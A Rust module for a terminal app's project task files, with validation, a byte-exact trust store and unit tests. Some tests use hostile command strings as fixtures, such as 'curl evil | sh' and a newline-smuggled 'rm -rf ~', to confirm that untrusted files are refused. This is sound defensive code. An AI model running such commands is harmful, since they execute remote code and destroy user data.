//! Project tasks: `.volt/tasks.toml`, plus the trust store that gates them.
//!
//! A tasks file is project code. One that arrives with a clone or a pull is
//! someone else's commands: automatic execution requires file-wide trust.
//! The UI may separately ask to run one reviewed command once, without changing
//! this trust store. Trust is a byte-for-byte copy of the reviewed
//! file kept in Volt's config folder; any edit makes the file untrusted again.
//! Files Volt itself writes (from the Add task form) are trusted on save.
use serde::Deserialize;
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use std::sync::Arc;

pub const TASKS_DIR: &str = ".volt";
pub const TASKS_FILE: &str = "tasks.toml";
pub const MAX_TASKS: usize = 32;
pub const MAX_FILE_BYTES: u64 = 64 * 1024;
pub const MAX_NAME_CHARS: usize = 48;
pub const MAX_RUN_CHARS: usize = 1000;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SaveOutcome {
    Trusted,
    NeedsReview,
}

/// One task as written in the file.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct TaskDef {
    pub name: String,
    /// One shell command line, typed into the terminal as written.
    pub run: String,
    /// Folder to run in, relative to the project folder. `None` = the project folder.
    #[serde(default)]
    pub cwd: Option<String>,
    /// Ask before every run.
    #[serde(default)]
    pub confirm: bool,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct TasksFile {
    #[serde(default)]
    task: Vec<TaskDef>,
}

/// Tasks for one project folder, as last read from disk.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ProjectTasks {
    /// The project folder: the one holding `.volt/`.
    pub root: PathBuf,
    pub tasks: Vec<TaskDef>,
    /// Whether this exact file content has been reviewed (or written by Volt).
    pub trusted: bool,
    /// Why the file couldn't be used, if it exists but is invalid.
    pub problem: Option<String>,
    /// Exact bytes shown to the user before Trust was clicked. Cheap to clone.
    pub source_bytes: Option<Arc<[u8]>>,
}

impl ProjectTasks {
    pub fn file(&self) -> PathBuf {
        tasks_file(&self.root)
    }
}

pub fn tasks_file(root: &Path) -> PathBuf {
    root.join(TASKS_DIR).join(TASKS_FILE)
}

/// The folder whose `.volt/tasks.toml` applies to `cwd`: the nearest ancestor
/// that has one, else the enclosing Git checkout, else `cwd` itself. Never the
/// home directory or `/`: those are not projects.
pub fn project_root(cwd: &Path, home: Option<&Path>) -> Option<PathBuf> {
    let broad = |dir: &Path| dir.parent().is_none() || Some(dir) == home;
    if broad(cwd) {
        return None;
    }
    let mut repo = None;
    for dir in cwd.ancestors().take(32) {
        if broad(dir) {
            break;
        }
        if std::fs::symlink_metadata(tasks_file(dir)).is_ok() {
            return Some(dir.to_path_buf());
        }
        if repo.is_none() && dir.join(".git").exists() {
            repo = Some(dir.to_path_buf());
        }
    }
    Some(repo.unwrap_or_else(|| cwd.to_path_buf()))
}

fn validate(task: &TaskDef) -> Result<(), String> {
    let name = task.name.trim();
    if name.is_empty() {
        return Err("a task has no name".into());
    }
    if name.chars().count() > MAX_NAME_CHARS || name.chars().any(char::is_control) {
        return Err(format!("task \"{}\" has an invalid name", safe(name)));
    }
    let run = task.run.trim();
    if run.is_empty() {
        return Err(format!("task \"{name}\" has no command"));
    }
    // The command is typed into the terminal as one line, so a newline or
    // other control character could smuggle in a second command.
    if run.chars().count() > MAX_RUN_CHARS || run.chars().any(char::is_control) {
        return Err(format!(
            "task \"{name}\" has a command Volt won't type (too long or multi-line)"
        ));
    }
    if let Some(cwd) = &task.cwd {
        let path = Path::new(cwd);
        if cwd.chars().any(char::is_control)
            || path.is_absolute()
            || path
                .components()
                .any(|c| matches!(c, std::path::Component::ParentDir))
        {
            return Err(format!("task \"{name}\" has a folder outside the project"));
        }
    }
    Ok(())
}

fn safe(s: &str) -> String {
    s.chars()
        .filter(|c| !c.is_control())
        .take(MAX_NAME_CHARS)
        .collect()
}

/// Parse and validate file content.
pub fn parse(text: &str) -> Result<Vec<TaskDef>, String> {
    let file: TasksFile = toml::from_str(text).map_err(|e| e.message().to_string())?;
    if file.task.len() > MAX_TASKS {
        return Err(format!("more than {MAX_TASKS} tasks"));
    }
    let mut names = std::collections::HashSet::new();
    for task in &file.task {
        validate(task)?;
        if !names.insert(task.name.trim().to_lowercase()) {
            return Err(format!(
                "two tasks are named \"{}\"",
                safe(task.name.trim())
            ));
        }
    }
    Ok(file
        .task
        .into_iter()
        .map(|t| TaskDef {
            name: t.name.trim().to_string(),
            run: t.run.trim().to_string(),
            cwd: t
                .cwd
                .map(|c| c.trim().to_string())
                .filter(|c| !c.is_empty() && c != "."),
            confirm: t.confirm,
        })
        .collect())
}

/// Read the file's bytes: regular files only (no symlinks), size-capped.
fn read_bytes(file: &Path) -> io::Result<Option<Vec<u8>>> {
    // Check the .volt directory itself too: an untrusted checkout must not
    // redirect task loading through a parent symlink.
    if let Some(parent) = file.parent() {
        match std::fs::symlink_metadata(parent) {
            Ok(meta) if !meta.is_dir() => {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidData,
                    "symlinked tasks directory",
                ));
            }
            Ok(_) => {}
            Err(err) if err.kind() == io::ErrorKind::NotFound => return Ok(None),
            Err(err) => return Err(err),
        }
    }
    let mut options = std::fs::OpenOptions::new();
    options.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        // A checkout can contain a FIFO at this path. Nonblocking open lets
        // the metadata check below reject it instead of freezing the UI.
        options.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
    }
    let handle = match options.open(file) {
        Ok(handle) => handle,
        Err(err) if err.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(err) => return Err(err),
    };
    let meta = handle.metadata()?;
    if !meta.is_file() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "not a regular file",
        ));
    }
    if meta.len() > MAX_FILE_BYTES {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "larger than 64 KB",
        ));
    }
    let mut bytes = Vec::with_capacity(meta.len().min(MAX_FILE_BYTES) as usize);
    handle.take(MAX_FILE_BYTES + 1).read_to_end(&mut bytes)?;
    if bytes.len() as u64 > MAX_FILE_BYTES {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "larger than 64 KB",
        ));
    }
    Ok(Some(bytes))
}

/// Load the tasks for `root`, checking trust against `trust_dir`.
pub fn load(root: &Path, trust_dir: Option<&Path>) -> ProjectTasks {
    let mut out = ProjectTasks {
        root: root.to_path_buf(),
        ..Default::default()
    };
    let file = tasks_file(root);
    let bytes = match read_bytes(&file) {
        Ok(Some(bytes)) => bytes,
        Ok(None) => return out,
        Err(err) => {
            out.problem = Some(format!(".volt/tasks.toml: {err}"));
            return out;
        }
    };
    let text = match String::from_utf8(bytes.clone()) {
        Ok(text) => text,
        Err(_) => {
            out.problem = Some(".volt/tasks.toml isn't UTF-8 text".into());
            return out;
        }
    };
    match parse(&text) {
        Ok(tasks) => out.tasks = tasks,
        Err(err) => {
            out.problem = Some(format!(".volt/tasks.toml: {err}"));
            return out;
        }
    }
    out.trusted = trust_dir
        .is_some_and(|dir| std::fs::read(trust_copy(dir, &file)).is_ok_and(|copy| copy == bytes));
    out.source_bytes = Some(Arc::from(bytes));
    out
}

/// Where the reviewed copy of `file` is kept: named by a stable hash of its path.
fn trust_copy(trust_dir: &Path, file: &Path) -> PathBuf {
    let key = file.canonicalize().unwrap_or_else(|_| file.to_path_buf());
    // FNV-1a: stable across runs and Rust versions. Only names the copy; the
    // trust decision compares full content, so collisions can't grant trust.
    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
    for byte in key.to_string_lossy().bytes() {
        hash ^= u64::from(byte);
        hash = hash.wrapping_mul(0x0100_0000_01b3);
    }
    trust_dir.join(format!("{hash:016x}.toml"))
}

/// Default trust store, in Volt's config folder.
pub fn trust_dir() -> Option<PathBuf> {
    crate::config::config_dir().map(|d| d.join("trusted-tasks"))
}

/// Record the file's current content as reviewed.
#[cfg(test)]
fn trust(root: &Path, trust_dir: &Path) -> io::Result<()> {
    let file = tasks_file(root);
    let bytes = read_bytes(&file)?
        .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "no tasks file"))?;
    write_atomically(&trust_copy(trust_dir, &file), &bytes, 0o600)
}

/// Trust only the exact bytes the card displayed. A file changed between
/// rendering the review and clicking Trust must be reviewed again.
pub fn trust_reviewed(root: &Path, trust_dir: &Path, reviewed: &[u8]) -> io::Result<()> {
    let file = tasks_file(root);
    let current = read_bytes(&file)?
        .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "no tasks file"))?;
    if current != reviewed {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "tasks file changed; review it again",
        ));
    }
    write_atomically(&trust_copy(trust_dir, &file), reviewed, 0o600)
}

fn write_atomically(target: &Path, bytes: &[u8], mode: u32) -> io::Result<()> {
    let dir = target.parent().unwrap_or_else(|| Path::new("."));
    std::fs::create_dir_all(dir)?;
    let name = target
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    for attempt in 0..32 {
        let tmp = dir.join(format!(".{name}.volt-{}-{attempt}.tmp", std::process::id()));
        let mut options = std::fs::OpenOptions::new();
        options.write(true).create_new(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.mode(mode);
        }
        #[cfg(not(unix))]
        let _ = mode;
        let mut file = match options.open(&tmp) {
            Ok(file) => file,
            Err(err) if err.kind() == io::ErrorKind::AlreadyExists => continue,
            Err(err) => return Err(err),
        };
        let result = (|| {
            file.write_all(bytes)?;
            file.sync_all()?;
            drop(file);
            std::fs::rename(&tmp, target)
        })();
        if result.is_err() {
            let _ = std::fs::remove_file(&tmp);
        }
        return result;
    }
    Err(io::Error::new(
        io::ErrorKind::AlreadyExists,
        "could not create a temporary file",
    ))
}

const HEADER: &str = "# Volt tasks for this project. Each task's `run` is typed into the terminal
# as one command line. Volt asks before running a tasks file it hasn't seen.
";

/// Add (`index = None`), replace, or delete (`task = None`) a task, keeping
/// the rest of the file's formatting and comments. The result is trusted
/// only if the file was new or already trusted: adding a task must never
/// vouch for someone else's unreviewed commands in the same file.
pub fn save(
    root: &Path,
    index: Option<usize>,
    task: Option<&TaskDef>,
    trust_dir: Option<&Path>,
) -> Result<SaveOutcome, String> {
    if let Some(task) = task {
        validate(task).map_err(|e| capitalize(&e))?;
    }
    let file = tasks_file(root);
    // Never write through a symlinked .volt directory into an unrelated path.
    let task_dir = root.join(TASKS_DIR);
    if let Ok(meta) = std::fs::symlink_metadata(&task_dir) {
        if !meta.is_dir() {
            return Err(".volt must be a real directory, not a symlink or file.".into());
        }
    }
    let existing = read_bytes(&file).map_err(|e| format!("Couldn't read .volt/tasks.toml: {e}"))?;
    let fresh = existing.is_none();
    let was_trusted = match (&existing, trust_dir) {
        (None, _) => true,
        (Some(bytes), Some(dir)) => {
            std::fs::read(trust_copy(dir, &file)).is_ok_and(|copy| copy == *bytes)
        }
        (Some(_), None) => false,
    };
    let text = match existing {
        Some(bytes) => {
            String::from_utf8(bytes).map_err(|_| ".volt/tasks.toml isn't UTF-8 text".to_string())?
        }
        None => String::new(),
    };
    // Never rewrite a file the user would lose content from, or one that is invalid.
    let current = parse(&text).map_err(|e| format!("Fix .volt/tasks.toml first: {e}"))?;
    let mut doc: toml_edit::Document = text
        .parse()
        .map_err(|e: toml_edit::TomlError| format!("Fix .volt/tasks.toml first: {e}"))?;
    if doc.get("task").is_none() {
        doc["task"] = toml_edit::Item::ArrayOfTables(toml_edit::ArrayOfTables::new());
    }
    let tables = doc["task"]
        .as_array_of_tables_mut()
        .ok_or_else(|| "Fix .volt/tasks.toml first: `task` must be [[task]] entries".to_string())?;
    match (index, task) {
        (None, Some(task)) => {
            if current.len() >= MAX_TASKS {
                return Err(format!("A project can have at most {MAX_TASKS} tasks."));
            }
            if current
                .iter()
                .any(|t| t.name.eq_ignore_ascii_case(task.name.trim()))
            {
                return Err(format!(
                    "There's already a task named \"{}\".",
                    task.name.trim()
                ));
            }
            tables.push(task_table(task, None));
        }
        (Some(i), Some(task)) => {
            if current
                .iter()
                .enumerate()
                .any(|(j, t)| j != i && t.name.eq_ignore_ascii_case(task.name.trim()))
            {
                return Err(format!(
                    "There's already a task named \"{}\".",
                    task.name.trim()
                ));
            }
            let old = tables.get_mut(i).ok_or("That task no longer exists.")?;
            let table = task_table(task, Some(old));
            *old = table;
        }
        (Some(i), None) => {
            if i >= tables.len() {
                return Err("That task no longer exists.".into());
            }
            tables.remove(i);
        }
        (None, None) => {
            return Ok(if was_trusted {
                SaveOutcome::Trusted
            } else {
                SaveOutcome::NeedsReview
            })
        }
    }
    // A new file starts with a short explanation above the first task.
    let out = if fresh {
        format!("{HEADER}\n{doc}")
    } else {
        doc.to_string()
    };
    if out.len() as u64 > MAX_FILE_BYTES {
        return Err("The tasks file would exceed 64 KB.".into());
    }
    parse(&out).map_err(|e| format!("Couldn't save: {e}"))?;
    write_atomically(&file, out.as_bytes(), 0o644)
        .map_err(|e| format!("Couldn't save .volt/tasks.toml: {e}"))?;
    if let Some(dir) = trust_dir.filter(|_| was_trusted) {
        if trust_reviewed(root, dir, out.as_bytes()).is_ok() {
            return Ok(SaveOutcome::Trusted);
        }
    }
    // The file is already saved. A trust-store failure must not make callers
    // retry the write and accidentally create a duplicate task.
    Ok(SaveOutcome::NeedsReview)
}

fn task_table(task: &TaskDef, old: Option<&toml_edit::Table>) -> toml_edit::Table {
    let mut table = old.cloned().unwrap_or_default();
    table["name"] = toml_edit::value(task.name.trim());
    table["run"] = toml_edit::value(task.run.trim());
    match task
        .cwd
        .as_deref()
        .map(str::trim)
        .filter(|c| !c.is_empty() && *c != ".")
    {
        Some(cwd) => table["cwd"] = toml_edit::value(cwd),
        None => {
            table.remove("cwd");
        }
    }
    if task.confirm {
        table["confirm"] = toml_edit::value(true);
    } else {
        table.remove("confirm");
    }
    table
}

fn capitalize(s: &str) -> String {
    let mut c = s.chars();
    match c.next() {
        Some(first) => first.to_uppercase().chain(c).collect::<String>() + ".",
        None => String::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn temp_dir() -> PathBuf {
        static N: AtomicUsize = AtomicUsize::new(0);
        let dir = std::env::temp_dir().join(format!(
            "volt-tasks-{}-{}",
            std::process::id(),
            N.fetch_add(1, Ordering::Relaxed)
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir.canonicalize().unwrap()
    }

    fn task(name: &str, run: &str) -> TaskDef {
        TaskDef {
            name: name.into(),
            run: run.into(),
            ..Default::default()
        }
    }

    #[test]
    fn files_parse_and_unsafe_tasks_are_rejected() {
        let ok = parse(
            "[[task]]\nname = \"Build\"\nrun = \"cargo build\"\ncwd = \"volt\"\nconfirm = true\n",
        )
        .unwrap();
        assert_eq!(ok[0].cwd.as_deref(), Some("volt"));
        assert!(ok[0].confirm);
        for bad in [
            "[[task]]\nname = \"x\"\nrun = \"a\\nrm -rf ~\"\n",
            "[[task]]\nname = \"x\"\nrun = \"make\"\ncwd = \"../elsewhere\"\n",
            "[[task]]\nname = \"x\"\nrun = \"make\"\ncwd = \"/etc\"\n",
            "[[task]]\nname = \"\"\nrun = \"make\"\n",
            "[[task]]\nname = \"x\"\nrun = \"\"\n",
            "[[task]]\nname = \"x\"\nrun = \"make\"\nshell = \"bash\"\n",
            "[[task]]\nname = \"a\"\nrun = \"x\"\n[[task]]\nname = \"A\"\nrun = \"y\"\n",
        ] {
            assert!(parse(bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn the_nearest_tasks_file_wins_then_the_checkout_never_home() {
        let home = temp_dir();
        let repo = home.join("code/app");
        std::fs::create_dir_all(repo.join(".git")).unwrap();
        std::fs::create_dir_all(repo.join("crates/ui/src")).unwrap();
        let deep = repo.join("crates/ui/src");
        assert_eq!(project_root(&deep, Some(&home)), Some(repo.clone()));
        std::fs::create_dir_all(repo.join("crates/ui/.volt")).unwrap();
        std::fs::write(tasks_file(&repo.join("crates/ui")), "").unwrap();
        assert_eq!(
            project_root(&deep, Some(&home)),
            Some(repo.join("crates/ui"))
        );
        assert_eq!(project_root(&home, Some(&home)), None);
        assert_eq!(project_root(Path::new("/"), Some(&home)), None);
        // A plain folder is its own project.
        let plain = home.join("notes");
        std::fs::create_dir_all(&plain).unwrap();
        assert_eq!(project_root(&plain, Some(&home)), Some(plain));
    }

    #[test]
    fn a_cloned_file_is_untrusted_until_reviewed_and_edits_revoke_trust() {
        let root = temp_dir();
        let trust_store = temp_dir();
        std::fs::create_dir_all(root.join(".volt")).unwrap();
        std::fs::write(
            tasks_file(&root),
            "[[task]]\nname = \"Build\"\nrun = \"make\"\n",
        )
        .unwrap();
        let loaded = load(&root, Some(&trust_store));
        assert_eq!(loaded.tasks.len(), 1);
        assert!(!loaded.trusted, "arrived with the repo");
        trust(&root, &trust_store).unwrap();
        assert!(load(&root, Some(&trust_store)).trusted);
        // Someone pushes a change: trust is gone until reviewed again.
        std::fs::write(
            tasks_file(&root),
            "[[task]]\nname = \"Build\"\nrun = \"make; curl evil | sh\"\n",
        )
        .unwrap();
        assert!(!load(&root, Some(&trust_store)).trusted);
    }

    #[test]
    fn volt_saves_keep_comments_and_are_trusted() {
        let root = temp_dir();
        let trust_store = temp_dir();
        save(
            &root,
            None,
            Some(&task("Build", "cargo build")),
            Some(&trust_store),
        )
        .unwrap();
        let text = std::fs::read_to_string(tasks_file(&root)).unwrap();
        assert!(text.starts_with("# Volt tasks"), "{text}");
        // A hand-written comment survives later saves.
        std::fs::write(tasks_file(&root), format!("{text}# keep me\n")).unwrap();
        trust(&root, &trust_store).unwrap();
        let mut test = task("Test", "cargo test");
        test.cwd = Some("volt".into());
        test.confirm = true;
        save(&root, None, Some(&test), Some(&trust_store)).unwrap();
        save(
            &root,
            Some(0),
            Some(&task("Build", "cargo build --release")),
            Some(&trust_store),
        )
        .unwrap();
        let loaded = load(&root, Some(&trust_store));
        assert!(loaded.trusted);
        assert_eq!(loaded.tasks[0].run, "cargo build --release");
        assert_eq!(
            loaded.tasks[1],
            TaskDef {
                name: "Test".into(),
                run: "cargo test".into(),
                cwd: Some("volt".into()),
                confirm: true
            }
        );
        assert!(std::fs::read_to_string(tasks_file(&root))
            .unwrap()
            .contains("# keep me"));
        save(&root, Some(0), None, Some(&trust_store)).unwrap();
        assert_eq!(load(&root, Some(&trust_store)).tasks.len(), 1);
    }

    #[test]
    fn adding_to_an_unreviewed_file_does_not_trust_it() {
        let root = temp_dir();
        let trust_store = temp_dir();
        std::fs::create_dir_all(root.join(".volt")).unwrap();
        std::fs::write(
            tasks_file(&root),
            "[[task]]\nname = \"Setup\"\nrun = \"curl evil | sh\"\n",
        )
        .unwrap();
        save(
            &root,
            None,
            Some(&task("Build", "make")),
            Some(&trust_store),
        )
        .unwrap();
        let loaded = load(&root, Some(&trust_store));
        assert_eq!(loaded.tasks.len(), 2);
        assert!(!loaded.trusted, "the cloned command was never reviewed");
    }

    #[test]
    fn trust_refuses_bytes_changed_after_the_card_review() {
        let root = temp_dir();
        let trust_store = temp_dir();
        std::fs::create_dir_all(root.join(".volt")).unwrap();
        std::fs::write(tasks_file(&root), "[[task]]\nname='Build'\nrun='make'\n").unwrap();
        let reviewed = load(&root, Some(&trust_store));
        let bytes = reviewed.source_bytes.unwrap();
        std::fs::write(
            tasks_file(&root),
            "[[task]]\nname='Build'\nrun='curl evil | sh'\n",
        )
        .unwrap();
        assert!(trust_reviewed(&root, &trust_store, &bytes).is_err());
        assert!(!load(&root, Some(&trust_store)).trusted);
    }

    #[test]
    fn saving_refuses_a_file_that_would_be_too_large_to_reload() {
        let root = temp_dir();
        std::fs::create_dir_all(root.join(".volt")).unwrap();
        std::fs::write(tasks_file(&root), format!("#{}\n", "x".repeat(65_500))).unwrap();
        assert!(save(&root, None, Some(&task("Build", "make")), None)
            .unwrap_err()
            .contains("64 KB"));
    }

    #[cfg(unix)]
    #[test]
    fn loading_a_fifo_does_not_wait_for_a_writer() {
        use std::ffi::CString;
        use std::os::unix::ffi::OsStrExt;
        let root = temp_dir();
        std::fs::create_dir_all(root.join(".volt")).unwrap();
        let name = CString::new(tasks_file(&root).as_os_str().as_bytes()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(name.as_ptr(), 0o600) }, 0);
        assert!(load(&root, None).problem.is_some());
        assert!(save(&root, None, Some(&task("Build", "make")), None).is_err());
    }

    #[test]
    fn a_saved_task_is_reported_as_saved_even_when_trust_store_fails() {
        let root = temp_dir();
        let trust_store = root.join("not-a-directory");
        std::fs::write(&trust_store, "blocked").unwrap();
        let outcome = save(
            &root,
            None,
            Some(&task("Build", "make")),
            Some(&trust_store),
        )
        .unwrap();
        assert_eq!(outcome, SaveOutcome::NeedsReview);
        let loaded = load(&root, Some(&trust_store));
        assert_eq!(loaded.tasks.len(), 1);
        assert!(!loaded.trusted);
    }

    #[test]
    fn saving_refuses_duplicates_bad_tasks_and_broken_files() {
        let root = temp_dir();
        save(&root, None, Some(&task("Build", "make")), None).unwrap();
        assert!(save(&root, None, Some(&task("build", "make all")), None)
            .unwrap_err()
            .contains("already"));
        assert!(save(&root, None, Some(&task("Two", "a\nb")), None).is_err());
        std::fs::write(tasks_file(&root), "[[task]\nbroken").unwrap();
        assert!(save(&root, None, Some(&task("X", "y")), None)
            .unwrap_err()
            .starts_with("Fix"));
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_and_oversized_files_are_not_read() {
        let root = temp_dir();
        let other = temp_dir();
        std::fs::write(
            other.join("t.toml"),
            "[[task]]\nname = \"X\"\nrun = \"y\"\n",
        )
        .unwrap();
        std::fs::create_dir_all(root.join(".volt")).unwrap();
        std::os::unix::fs::symlink(other.join("t.toml"), tasks_file(&root)).unwrap();
        let loaded = load(&root, None);
        assert!(loaded.tasks.is_empty() && loaded.problem.is_some());
        let big = temp_dir();
        std::fs::create_dir_all(big.join(".volt")).unwrap();
        std::fs::write(tasks_file(&big), "#".repeat(70 * 1024)).unwrap();
        assert!(load(&big, None).problem.is_some());

        let redirected = temp_dir();
        let destination = temp_dir();
        std::os::unix::fs::symlink(&destination, redirected.join(".volt")).unwrap();
        std::fs::write(
            destination.join("tasks.toml"),
            "[[task]]\nname='X'\nrun='y'\n",
        )
        .unwrap();
        assert!(load(&redirected, None).problem.is_some());
        std::fs::remove_file(destination.join("tasks.toml")).unwrap();
        assert!(save(&redirected, None, Some(&task("Build", "make")), None).is_err());
        assert!(!destination.join("tasks.toml").exists());
    }
}
